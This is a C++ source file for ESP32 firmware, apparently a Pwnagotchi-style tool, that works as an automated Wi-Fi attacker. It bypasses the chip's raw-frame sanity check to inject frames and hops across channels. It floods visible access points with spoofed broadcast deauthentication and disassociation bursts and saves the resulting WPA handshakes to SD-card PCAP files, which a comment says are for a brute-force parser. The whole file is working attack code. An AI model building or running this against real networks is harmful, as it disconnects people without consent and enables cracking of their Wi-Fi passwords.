#include "WiFiHunter.h"
#include <Arduino.h>
#include <WiFi.h>
#include <SD.h>
#include "esp_wifi.h"
#include <freertos/FreeRTOS.h>
#include <freertos/task.h>
#include <cstring>
#include <cstdio>

WiFiHunter* WiFiHunter::_instance = nullptr;

// Allow raw 802.11 frame injection — patch.py weakens the symbol in libnet80211.a
extern "C" int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t, int32_t) {
    if (arg == 31337) return 1;
    return 0;
}

// ── PCAP structs ──────────────────────────────────────────────

#pragma pack(push, 1)
struct PcapGlobalHdr {
    uint32_t magic_number  = 0xA1B2C3D4;
    uint16_t version_major = 2;
    uint16_t version_minor = 4;
    int32_t  thiszone      = 0;
    uint32_t sigfigs       = 0;
    uint32_t snaplen       = 65535;
    uint32_t network       = 105;  // IEEE 802.11
};
struct PcapRecHdr {
    uint32_t ts_sec;
    uint32_t ts_usec;
    uint32_t incl_len;
    uint32_t orig_len;
};
#pragma pack(pop)

// ── Init ──────────────────────────────────────────────────────

void WiFiHunter::init() {
    _instance = this;

    WiFi.mode(WIFI_MODE_APSTA);

    esp_wifi_set_promiscuous_rx_cb(
        [](void* buf, wifi_promiscuous_pkt_type_t t){ _instance->_promiscCb(buf, t); }
    );
    esp_wifi_set_promiscuous(true);
    esp_wifi_set_channel(_channel, WIFI_SECOND_CHAN_NONE);

    _phase        = Phase::Dwell;
    _dwellStartMs = 0;
    _skipBeacons  = false;

    Serial.printf("[WIFI] Dwell started ch%d dwell=%ums\n", _channel, DWELL_MS);
}

// ── Clear all findings (called on full-cycle exhaust) ─────────

void WiFiHunter::clearFindings(uint32_t ms) {
    _apCount        = 0;
    memset(_aps,      0, sizeof(_aps));
    memset(_beaconLen, 0, sizeof(_beaconLen));   // lengths zeroed; raw data left (overwritten on next use)
    memset(_pendingEapolCount, 0, sizeof(_pendingEapolCount));
    memset(_pendingEapolLen,   0, sizeof(_pendingEapolLen));

    _attackQueueLen  = 0;
    _attackQueueIdx  = 0;

    _phase        = Phase::Dwell;
    _dwellStartMs = ms;                          // fresh dwell window starts now

    _apFoundCount       = 0;
    _deauthTargetCount  = 0;
    _deauthBurstCount   = 0;
    _eapolEventCount    = 0;
    _captureCount       = 0;
    _externalDeauthCount = 0;

    _lastFoundSsid[0]        = '\0';
    _lastDeauthSsid[0]       = '\0';
    _lastEapolSsid[0]        = '\0';
    _lastCapturePath[0]      = '\0';
    _lastExternalDeauthSsid[0] = '\0';

    Serial.printf("[WIFI] Findings cleared — fresh dwell ch%d\n", _channel);
}

// ── Update — main loop ────────────────────────────────────────

void WiFiHunter::update(uint32_t ms) {
    _skipBeacons = false;
    _flush();

    if (_phase == Phase::Dwell) {
        if (ms - _dwellStartMs >= DWELL_MS) {
            _buildAttackQueue();
            if (_attackQueueLen > 0) {
                _phase         = Phase::Attack;
                _attackQueueIdx = 0;
                _deauthLastMs   = ms - DEAUTH_INTERVAL_MS - 1; // fire first deauth immediately
                Serial.printf("[WIFI] Attack: %d targets on ch%d\n", _attackQueueLen, _channel);
            } else {
                _hopChannel();
                _dwellStartMs = ms;
            }
        }
        return;
    }

    if (_phase == Phase::Attack) {
        // Advance past targets that are done (captured or maxed out)
        while (_attackQueueIdx < _attackQueueLen) {
            const ApInfo& ap = _aps[_attackQueue[_attackQueueIdx]];
            if (!ap.validated && ap.deauthCount < MAX_DEAUTH_ATTEMPTS) break;
            _attackQueueIdx++;
            _deauthLastMs = ms - DEAUTH_INTERVAL_MS - 1; // next target fires immediately
        }

        if (_attackQueueIdx >= _attackQueueLen) {
            _phase        = Phase::DwellWait;
            _dwellStartMs = ms;
            Serial.println("[WIFI] Queue exhausted — DwellWait");
            return;
        }

        if (ms - _deauthLastMs >= DEAUTH_INTERVAL_MS) {
            ApInfo& ap = _aps[_attackQueue[_attackQueueIdx]];
            if (!ap.validated) {
                _deauthAp(ap);
            }
            _deauthLastMs = ms;
        }
        return;
    }

    if (_phase == Phase::DwellWait) {
        _buildAttackQueue();
        if (_attackQueueLen > 0) {
            _phase         = Phase::Attack;
            _attackQueueIdx = 0;
            _deauthLastMs   = ms - DEAUTH_INTERVAL_MS - 1;
            return;
        }
        if (ms - _dwellStartMs >= DWELL_WAIT_MS) {
            _hopChannel();
            _dwellStartMs = ms;
            _phase        = Phase::Dwell;
        }
    }
}


// ── Promiscuous callback (ISR context) ────────────────────────

void WiFiHunter::_promiscCb(void* buf, wifi_promiscuous_pkt_type_t type) {
    if (!_instance) return;
    if (type != WIFI_PKT_MGMT && type != WIFI_PKT_DATA) return;

    const auto*    pkt = static_cast<wifi_promiscuous_pkt_t*>(buf);
    const uint8_t* pay = pkt->payload;
    const uint16_t len = static_cast<uint16_t>(pkt->rx_ctrl.sig_len);

    if (len < 24) return;

    const uint16_t fc    = (uint16_t)pay[0] | ((uint16_t)pay[1] << 8);
    const uint8_t fcType = (fc & 0x000C) >> 2;
    const uint8_t fcSub  = (fc & 0x00F0) >> 4;

    // ── Beacon (management type=0, subtype=8) ─────────────────
    if (fcType == 0 && fcSub == 8 && len >= 36) {
        if (_instance->_skipBeacons) return;
        int next = (_instance->_ringHead + 1) % RING_SIZE;
        if (next == _instance->_ringTail) return;

        RawFrame& slot  = _instance->_ring[_instance->_ringHead];
        slot.len        = (len <= MAX_FRAME) ? len : MAX_FRAME;
        slot.channel    = static_cast<uint8_t>(pkt->rx_ctrl.channel);
        slot.isBeacon   = true;
        slot.isDeauth   = false;
        memcpy(slot.data, pay, slot.len);
        _instance->_ringHead = next;
        return;
    }

    // ── Deauth (subtype=12) / Disassoc (subtype=10) ───────────
    if (fcType == 0 && (fcSub == 12 || fcSub == 10) && len >= 26) {
        int next = (_instance->_ringHead + 1) % RING_SIZE;
        if (next == _instance->_ringTail) return;

        RawFrame& slot  = _instance->_ring[_instance->_ringHead];
        slot.len        = (len <= MAX_FRAME) ? len : MAX_FRAME;
        slot.channel    = static_cast<uint8_t>(pkt->rx_ctrl.channel);
        slot.isBeacon   = false;
        slot.isDeauth   = true;
        memcpy(slot.data, pay, slot.len);
        _instance->_ringHead = next;
        return;
    }

    // ── Data frame (type=2) — search for SNAP+EAPOL ───────────
    if (fcType != 2) return;

    const uint8_t toDs   =  pay[1] & 0x01;
    const uint8_t fromDs = (pay[1] & 0x02) >> 1;

    // Scan for SNAP + EAPOL ethertype
    static const uint8_t SNAP[8] = { 0xAA, 0xAA, 0x03, 0x00, 0x00, 0x00, 0x88, 0x8E };
    bool found = false;
    for (uint16_t i = 24; i + 9 <= len; i++) {
        bool match = true;
        for (int k = 0; k < 8; k++) {
            if (pay[i + k] != SNAP[k]) { match = false; break; }
        }
        if (!match) continue;
        if (pay[i + 9] != 0x03) return;  // must be EAPOL-Key
        found = true;
        break;
    }
    if (!found) return;

    int next = (_instance->_ringHead + 1) % RING_SIZE;
    if (next == _instance->_ringTail) return;

    RawFrame& slot  = _instance->_ring[_instance->_ringHead];
    slot.len        = (len <= MAX_FRAME) ? len : MAX_FRAME;
    slot.channel    = static_cast<uint8_t>(pkt->rx_ctrl.channel);
    slot.isBeacon   = false;
    slot.isDeauth   = false;

    // BSSID extraction: handle all ToDS/FromDS combinations
    // ToDS=1,FromDS=0 (STA→AP): addr1=BSSID  ToDS=0,FromDS=1 (AP→STA): addr2=BSSID
    // Otherwise IBSS/WDS: addr3=BSSID
    (void)toDs; (void)fromDs;  // extracted below via pay[] offsets

    memcpy(slot.data, pay, slot.len);
    _instance->_ringHead = next;
}

// ── Flush ring ────────────────────────────────────────────────

void WiFiHunter::_flush() {
    while (_ringTail != _ringHead) {
        const RawFrame& f = _ring[_ringTail];
        if (f.isDeauth)
            _processDeauth(f);
        else if (f.isBeacon)
            _processBeacon(f);
        else
            _processEapol(f);
        _ringTail = (_ringTail + 1) % RING_SIZE;
    }
}

// ── EAPOL message type parser ─────────────────────────────────
// Returns 1=M1, 2=M2, 3=M3, 4=M4, 0=unknown.
// Outputs the snap body offset into *snapOffOut if not null.

int WiFiHunter::_parseEapolMsg(const uint8_t* data, uint16_t len, int* snapOffOut) {
    static const uint8_t SNAP[8] = { 0xAA, 0xAA, 0x03, 0x00, 0x00, 0x00, 0x88, 0x8E };
    for (uint16_t i = 24; i + 16 <= len; i++) {
        bool match = true;
        for (int k = 0; k < 8; k++) {
            if (data[i + k] != SNAP[k]) { match = false; break; }
        }
        if (!match) continue;

        const uint8_t* e = data + i + 8;   // after SNAP = EAPOL header
        if (len < i + 8 + 49) return 0;    // need at least up to nonce
        if (e[1] != 0x03) return 0;        // must be EAPOL-Key
        if (e[4] != 0x02) return 0;        // RSN descriptor

        if (snapOffOut) *snapOffOut = (int)i;

        const uint16_t ki  = ((uint16_t)e[5] << 8) | e[6];
        const bool     ack = (ki & 0x0080) != 0;
        const bool     mic = (ki & 0x0100) != 0;
        const bool     ins = (ki & 0x0040) != 0;

        if  ( ack && !mic)        return 1;  // M1: ANonce from AP
        if  ( ack &&  mic)        return 3;  // M3: ANonce + MIC from AP
        if  (!ack &&  mic && !ins) {
            bool nonceZero = true;
            for (int z = 0; z < 32; z++) {
                if (e[17 + z] != 0) { nonceZero = false; break; }
            }
            return nonceZero ? 4 : 2;        // M2: SNonce from STA  M4: zero nonce
        }
        return 0;
    }
    return 0;
}

// ── Beacon processing ─────────────────────────────────────────

void WiFiHunter::_processBeacon(const RawFrame& f) {
    if (f.len < 38) return;
    const uint8_t* pay   = f.data;
    const uint8_t* bssid = pay + 16;  // addr3 = BSSID in beacon

    ApInfo* ap = _findAp(bssid);
    if (ap && ap->validated) return;

    // Parse SSID from IEs (start at offset 36)
    char ssid[33] = {};
    const uint8_t* ie  = pay + 36;
    const uint8_t* end = pay + f.len;
    while (ie + 2 <= end) {
        uint8_t id  = ie[0];
        uint8_t iel = ie[1];
        if (ie + 2 + iel > end) break;
        if (id == 0 && iel >= 1 && iel <= 32) {
            memcpy(ssid, ie + 2, iel);
            ssid[iel] = '\0';
            break;
        }
        ie += 2 + iel;
    }

    bool wasNew = false;
    if (!ap) {
        ap = _registerAp(bssid);
        if (!ap) return;
        ap->channel = f.channel;
        wasNew = true;
    } else {
        ap->channel = f.channel;
    }

    int idx = (int)(ap - _aps);

    // SSID may not yet be set — EAPOL can register an AP first with empty SSID.
    // This is where we fill it from the beacon.
    bool ssidJustLearned = false;
    if (ap->ssid[0] == '\0' && ssid[0] != '\0') {
        memcpy(ap->ssid, ssid, sizeof(ssid));
        ssidJustLearned = true;
    }

    // If a valid pcap is already on disk for this AP, skip everything else:
    // no beacon storage, no file (re)open, no further EAPOL processing.
    if (ap->ssid[0] != '\0' && _pcapIsComplete(*ap)) {
        ap->validated = true;
        ap->pcapCreated = true;
        _pendingEapolCount[idx] = 0;
        memset(_pendingEapolLen[idx], 0, sizeof(_pendingEapolLen[idx]));
        if (wasNew || ssidJustLearned) {
            Serial.printf("[AP] Skip \"%s\" — pcap already complete\n", ap->ssid);
        }
        return;
    }

    if (_beaconLen[idx] == 0) {
        uint16_t stored = (f.len <= MAX_FRAME) ? f.len : MAX_FRAME;
        memcpy(_beaconData[idx], f.data, stored);
        _beaconLen[idx] = stored;
    }

    if (wasNew) {
        _apFoundCount++;
        strncpy(_lastFoundSsid, ssid, 32);
        _lastFoundSsid[32] = '\0';
        Serial.printf("[AP] New %02X:%02X:%02X:%02X:%02X:%02X ch%d \"%s\"\n",
                      bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5],
                      f.channel, ssid);
    } else if (ssidJustLearned) {
        _apFoundCount++;
        strncpy(_lastFoundSsid, ssid, 32);
        _lastFoundSsid[32] = '\0';
        Serial.printf("[AP] SSID learned for %02X:%02X:%02X:%02X:%02X:%02X \"%s\"\n",
                      bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5], ssid);
    }

    // If SSID + beacon now both known, write header + beacon to PCAP
    // and flush any EAPOL frames that were buffered while SSID was unknown.
    if (ap->ssid[0] != '\0' && _beaconLen[idx] > 0) {
        _ensurePcapWithBeacon(*ap, idx);
        _flushPendingEapol(*ap, idx);
    }
}

// ── PCAP create + beacon write (idempotent) ──────────────────

void WiFiHunter::_ensurePcapWithBeacon(ApInfo& ap, int idx) {
    if (ap.pcapCreated) return;
    if (ap.ssid[0] == '\0' || _beaconLen[idx] == 0) return;

    char path[64];
    _buildFilePath(path, sizeof(path), ap);

    // FILE_WRITE on ESP32-Arduino maps to "w" which truncates an existing file.
    // Only open in write mode when the file is genuinely new — otherwise the
    // global header gets wiped and subsequent FILE_APPEND writes leave a
    // header-less pcap that parsers reject ("bad pcap header").
    if (!SD.exists(path)) {
        File pcap = SD.open(path, FILE_WRITE);
        if (!pcap) {
            Serial.printf("[PCAP] Open failed: %s\n", path);
            return;
        }
        _writePcapHeader(pcap);
        _appendPcapFrame(pcap, _beaconData[idx], _beaconLen[idx]);
        pcap.close();
    }
    ap.pcapCreated = true;
}

// ── Flush per-AP buffered EAPOL frames after PCAP exists ─────

void WiFiHunter::_flushPendingEapol(ApInfo& ap, int idx) {
    if (!ap.pcapCreated || _pendingEapolCount[idx] == 0) return;

    char path[64];
    _buildFilePath(path, sizeof(path), ap);
    File pcap = SD.open(path, FILE_APPEND);
    if (!pcap) return;

    for (int i = 0; i < _pendingEapolCount[idx]; i++) {
        const uint8_t* data = _pendingEapol[idx][i];
        uint16_t       len  = _pendingEapolLen[idx][i];
        if (len == 0) continue;
        _appendPcapFrame(pcap, data, len);
        _validateEapol(ap, data, len);
        if (ap.validated) {
            _captureCount++;
            _buildFilePath(_lastCapturePath, sizeof(_lastCapturePath), ap);
            Serial.printf("[PCAP] Handshake captured (flushed): \"%s\" (total=%lu)\n",
                          ap.ssid, (unsigned long)_captureCount);
        }
    }
    pcap.close();

    _pendingEapolCount[idx] = 0;
    memset(_pendingEapolLen[idx], 0, sizeof(_pendingEapolLen[idx]));
}

// ── Buffer one EAPOL frame for an AP without SSID yet ────────

void WiFiHunter::_bufferEapol(int idx, const uint8_t* data, uint16_t len) {
    uint8_t n = _pendingEapolCount[idx];
    uint16_t copyLen = (len <= MAX_FRAME) ? len : MAX_FRAME;

    if (n < MAX_PENDING_PER_AP) {
        memcpy(_pendingEapol[idx][n], data, copyLen);
        _pendingEapolLen[idx][n] = copyLen;
        _pendingEapolCount[idx]  = n + 1;
        return;
    }
    // Buffer full: drop oldest, shift, append newest
    for (int i = 1; i < MAX_PENDING_PER_AP; i++) {
        memcpy(_pendingEapol[idx][i - 1], _pendingEapol[idx][i], _pendingEapolLen[idx][i]);
        _pendingEapolLen[idx][i - 1] = _pendingEapolLen[idx][i];
    }
    int last = MAX_PENDING_PER_AP - 1;
    memcpy(_pendingEapol[idx][last], data, copyLen);
    _pendingEapolLen[idx][last] = copyLen;
}

// ── M1+M2 STA-MAC pairing (writes ApInfo nonces/MACs) ────────

void WiFiHunter::_validateEapol(ApInfo& ap, const uint8_t* pay, uint16_t flen) {
    int snapOff = -1;
    int msg = _parseEapolMsg(pay, flen, &snapOff);
    if (msg == 0 || snapOff < 0) return;

    const uint8_t* e = pay + snapOff + 8;

    if (msg == 1 || msg == 3) {
        // M1/M3: AP→STA. addr1 = DA = STA.
        memcpy(ap.anonce,   e + 17, 32);
        memcpy(ap.staMacM1, pay + 4, 6);
        ap.hasAnonce = true;
        if (ap.hasM2 && memcmp(ap.staMacM1, ap.staMacM2, 6) == 0) {
            ap.validated = true;
        }
    } else if (msg == 2) {
        // M2: STA→AP. addr2 = SA = STA.
        memcpy(ap.staMacM2, pay + 10, 6);
        ap.hasM2 = true;
        if (ap.hasAnonce && memcmp(ap.staMacM1, ap.staMacM2, 6) == 0) {
            ap.validated = true;
        }
    }
}

// ── Deauth / Disassoc processing ─────────────────────────────

void WiFiHunter::_processDeauth(const RawFrame& f) {
    if (f.len < 26) return;
    const uint8_t* bssid = f.data + 16;  // addr3 = BSSID in deauth/disassoc

    ApInfo* ap = _findAp(bssid);
    if (!ap || ap->ssid[0] == '\0') return;  // unknown or unnamed AP, skip

    uint32_t now = millis();
    if (now - ap->deauthDetectedMs < 5000) return;  // deduplicate within 5 s

    ap->deauthDetectedMs = now;
    _externalDeauthCount++;
    strncpy(_lastExternalDeauthSsid, ap->ssid, 32);
    _lastExternalDeauthSsid[32] = '\0';

    Serial.printf("[DEAUTH-RX] \"%s\" ch%d\n", ap->ssid, f.channel);
}

// ── EAPOL processing ─────────────────────────────────────────

void WiFiHunter::_processEapol(const RawFrame& f) {
    if (f.len < 24) return;
    const uint8_t* pay = f.data;

    const uint8_t toDs   =  pay[1] & 0x01;
    const uint8_t fromDs = (pay[1] & 0x02) >> 1;

    // BSSID extraction: all ToDS/FromDS cases
    uint8_t bssid[6];
    if (toDs && !fromDs) {
        memcpy(bssid, pay + 4,  6);  // STA→AP: addr1 = BSSID
    } else if (!toDs && fromDs) {
        memcpy(bssid, pay + 10, 6);  // AP→STA: addr2 = BSSID
    } else {
        memcpy(bssid, pay + 16, 6);  // IBSS/WDS: addr3 = BSSID
    }

    // Classify EAPOL message type
    int snapOff = -1;
    int msg = _parseEapolMsg(pay, f.len, &snapOff);
    if (msg == 0) return;  // not a recognizable handshake message

    ApInfo* ap = _findAp(bssid);
    if (!ap) {
        ap = _registerAp(bssid);
        if (!ap) return;
        ap->channel = f.channel;
    }
    if (ap->validated) return;

    int idx = (int)(ap - _aps);

    _eapolEventCount++;
    _lastEapolMsg = msg;
    strncpy(_lastEapolSsid, ap->ssid, 32);
    _lastEapolSsid[32] = '\0';

    Serial.printf("[EAPOL] M%d %02X:%02X:%02X:%02X:%02X:%02X ch%d ssid=\"%s\"\n",
                  msg,
                  bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5],
                  f.channel, ap->ssid);

    // SSID + beacon must be known before writing the PCAP — otherwise
    // the resulting file has empty SSID in its name and no beacon record,
    // which the brute-force parser cannot resolve back to an SSID.
    if (ap->ssid[0] == '\0' || _beaconLen[idx] == 0) {
        _bufferEapol(idx, f.data, f.len);
        _validateEapol(*ap, pay, f.len);
        // Don't count as a capture yet — file isn't on disk.
        return;
    }

    _ensurePcapWithBeacon(*ap, idx);
    _flushPendingEapol(*ap, idx);  // drain any earlier-buffered frames first

    // Append the current frame
    char path[64];
    _buildFilePath(path, sizeof(path), *ap);
    {
        File pcap = SD.open(path, FILE_APPEND);
        if (pcap) {
            _appendPcapFrame(pcap, f.data, f.len);
            pcap.close();
        }
    }

    // Pairing: M1/M3 + M2 with matching STA MAC
    bool wasValid = ap->validated;
    _validateEapol(*ap, pay, f.len);
    if (ap->validated && !wasValid) {
        _captureCount++;
        _buildFilePath(_lastCapturePath, sizeof(_lastCapturePath), *ap);
        Serial.printf("[PCAP] Handshake captured: \"%s\" (total=%lu)\n",
                      ap->ssid, (unsigned long)_captureCount);
    }
}

// ── Channel hop ───────────────────────────────────────────────

void WiFiHunter::_hopChannel() {
    // Reset deauth counters so APs are eligible again on next visit
    for (int i = 0; i < _apCount; i++) {
        if (!_aps[i].validated) _aps[i].deauthCount = 0;
    }
    _channel = (_channel % 13) + 1;
    esp_wifi_set_channel(_channel, WIFI_SECOND_CHAN_NONE);
    Serial.printf("[WIFI] → ch%d\n", _channel);
}

// ── Build attack queue — unvalidated APs on current channel ──

void WiFiHunter::_buildAttackQueue() {
    if (_guardMode) return;
    _attackQueueLen = 0;
    for (int i = 0; i < _apCount; i++) {
        const ApInfo& ap = _aps[i];
        if (ap.channel != _channel) continue;
        if (ap.validated) continue;
        if (ap.deauthCount >= MAX_DEAUTH_ATTEMPTS) continue;
        _attackQueue[_attackQueueLen++] = (uint8_t)i;
    }
}

// ── Send broadcast deauth burst ───────────────────────────────

void WiFiHunter::_deauthAp(const ApInfo& ap) {
    uint8_t frame[26];
    // Frame control: deauth (0xC0) or disassoc (0xA0)
    frame[0] = 0xC0; frame[1] = 0x00;  // FC
    frame[2] = 0x3A; frame[3] = 0x01;  // Duration
    // addr1 = DA = broadcast
    memset(frame + 4, 0xFF, 6);
    // addr2 = SA = BSSID (spoofed as AP)
    memcpy(frame + 10, ap.bssid, 6);
    // addr3 = BSSID
    memcpy(frame + 16, ap.bssid, 6);
    // reason: 0x02 = prev auth no longer valid
    frame[24] = 0x02; frame[25] = 0x00;

    for (int i = 0; i < DEAUTH_BURSTS; i++) {
        uint16_t sc = (uint16_t)((_deauthSeq & 0x0FFF) << 4);
        frame[22] = (uint8_t)(sc & 0xFF);
        frame[23] = (uint8_t)(sc >> 8);
        _deauthSeq++;

        frame[0] = 0xC0;  // deauth
        esp_wifi_80211_tx(WIFI_IF_AP, frame, sizeof(frame), false);
        frame[0] = 0xA0;  // disassoc
        esp_wifi_80211_tx(WIFI_IF_AP, frame, sizeof(frame), false);
        vTaskDelay(1 / portTICK_PERIOD_MS);
    }

    // const_cast: deauthCount update needs mutable — find by BSSID
    ApInfo* mutable_ap = _findAp(ap.bssid);
    if (mutable_ap) {
        if (mutable_ap->deauthCount == 0) {
            _deauthTargetCount++;
            strncpy(_lastDeauthSsid, ap.ssid, 32);
            _lastDeauthSsid[32] = '\0';
        }
        mutable_ap->deauthCount++;
        _deauthBurstCount++;
        Serial.printf("[DEAUTH] %02X:%02X:%02X:%02X:%02X:%02X burst#%d (broadcast)\n",
                      ap.bssid[0], ap.bssid[1], ap.bssid[2],
                      ap.bssid[3], ap.bssid[4], ap.bssid[5],
                      mutable_ap->deauthCount);
    }
}

// ── AP table helpers ─────────────────────────────────────────

WiFiHunter::ApInfo* WiFiHunter::_findAp(const uint8_t* bssid) {
    for (int i = 0; i < _apCount; i++)
        if (memcmp(_aps[i].bssid, bssid, 6) == 0) return &_aps[i];
    return nullptr;
}

WiFiHunter::ApInfo* WiFiHunter::_registerAp(const uint8_t* bssid) {
    if (_apCount >= MAX_APS) return nullptr;
    ApInfo& ap = _aps[_apCount++];
    memset(&ap, 0, sizeof(ap));
    memcpy(ap.bssid, bssid, 6);
    return &ap;
}

// ── PCAP I/O ─────────────────────────────────────────────────

void WiFiHunter::_writePcapHeader(File& f) {
    PcapGlobalHdr hdr{};
    f.write(reinterpret_cast<const uint8_t*>(&hdr), sizeof(hdr));
}

void WiFiHunter::_appendPcapFrame(File& f, const uint8_t* data, uint16_t len) {
    PcapRecHdr rec{};
    rec.ts_sec   = millis() / 1000;
    rec.ts_usec  = (millis() % 1000) * 1000;
    rec.incl_len = len;
    rec.orig_len = len;
    f.write(reinterpret_cast<const uint8_t*>(&rec), sizeof(rec));
    f.write(data, len);
}

void WiFiHunter::_buildFilePath(char* buf, int bufLen, const ApInfo& ap) {
    char hex[13];
    snprintf(hex, sizeof(hex), "%02X%02X%02X%02X%02X%02X",
             ap.bssid[0], ap.bssid[1], ap.bssid[2],
             ap.bssid[3], ap.bssid[4], ap.bssid[5]);

    char safe[33] = {};
    for (int i = 0; ap.ssid[i] && i < 32; i++) {
        char c = ap.ssid[i];
        safe[i] = ((c >= 'A' && c <= 'Z') || (c >= 'a' && c <= 'z') ||
                   (c >= '0' && c <= '9') || c == '-' || c == '.')
                  ? c : '_';
    }

    snprintf(buf, bufLen, "/netgotchi/eapol/%s_%s.pcap", hex, safe);
}

bool WiFiHunter::_pcapIsComplete(const ApInfo& ap) {
    char path[64];
    _buildFilePath(path, sizeof(path), ap);

    File f = SD.open(path, FILE_READ);
    if (!f) return false;

    if ((uint32_t)f.size() <= sizeof(PcapGlobalHdr)) { f.close(); return false; }
    f.seek(sizeof(PcapGlobalHdr));

    uint8_t  staMacAnonce[6] = {};
    uint8_t  staMacM2[6]     = {};
    bool     hasAnonce        = false;
    bool     hasM2            = false;
    uint8_t  buf[MAX_FRAME];

    while ((uint32_t)f.available() >= sizeof(PcapRecHdr)) {
        PcapRecHdr rec;
        if (f.read(reinterpret_cast<uint8_t*>(&rec), sizeof(rec)) != sizeof(rec)) break;

        uint32_t toRead = (rec.incl_len <= MAX_FRAME) ? rec.incl_len : MAX_FRAME;
        uint32_t nRead  = f.read(buf, toRead);
        if (rec.incl_len > toRead) f.seek(f.position() + (rec.incl_len - toRead));
        if (nRead < toRead) break;

        int msg = _parseEapolMsg(buf, (uint16_t)nRead, nullptr);
        if (msg == 1 || msg == 3) {
            memcpy(staMacAnonce, buf + 4, 6);   // addr1 = DA = STA (AP→STA)
            hasAnonce = true;
        } else if (msg == 2) {
            memcpy(staMacM2,     buf + 10, 6);  // addr2 = SA = STA (STA→AP)
            hasM2 = true;
        }

        if (hasAnonce && hasM2 && memcmp(staMacAnonce, staMacM2, 6) == 0) {
            f.close();
            return true;
        }
    }

    f.close();
    return false;
}
